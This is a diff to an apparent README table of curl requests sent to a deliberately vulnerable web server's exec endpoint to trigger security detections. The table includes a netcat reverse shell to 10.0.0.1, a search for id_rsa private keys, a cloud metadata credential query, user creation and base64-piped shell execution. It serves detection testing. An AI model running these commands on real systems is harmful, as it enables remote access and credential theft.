@@ -66,7 +66,7 @@ export WEBSERVERIP=192.168.1.15
 | Search Private Keys or Passwords | `curl -X POST http://$WEBSERVERIP/exec -d 'command=find / -name id_rsa` |
 | Netcat Remote Code Execution in Contianer | `curl -X POST http://$WEBSERVERIP/exec -d 'command=nc 10.0.0.1 4242 -e bash'` |
 | Contact EC2 Instance Metadata Service From Container | `curl -X POST http://$WEBSERVERIP/exec -d 'command=curl http://169.254.169.254/latest/meta-data/iam/info'` |
-| [WIP] Suspicious Home Directory Creation | `curl -X POST http://$WEBSERVERIP/exec -d 'command=sh -c adduser -h /dev/null -s /bin/sh test3 -D'` |
+| Suspicious Home Directory Creation | `curl -X POST http://$WEBSERVERIP/exec -d 'command=adduser -h /dev/null -s /bin/sh -D test'` |
 | Base64-encoded Python Script Execution | `curl -X POST http://$WEBSERVERIP/exec -d 'command=echo cHl0aG9uMyAtYyAnaW1wb3J0IF9faGVsbG9fXycK \| base64 -d \| sh'` |
 | Base64-encoded Shell Script Execution | `curl -X POST http://$WEBSERVERIP/exec -d 'command=echo IyEvYmluL3NoCmVjaG8gIkhlbGxvIFdvcmxkIgo= \|base64 -d \|sh'` |
 | Base64'd ELF file on Command Line | `curl -X POST http://$WEBSERVERIP/exec -d 'command=echo f0VMRgIB1M== \|base64 -d > hello'` |
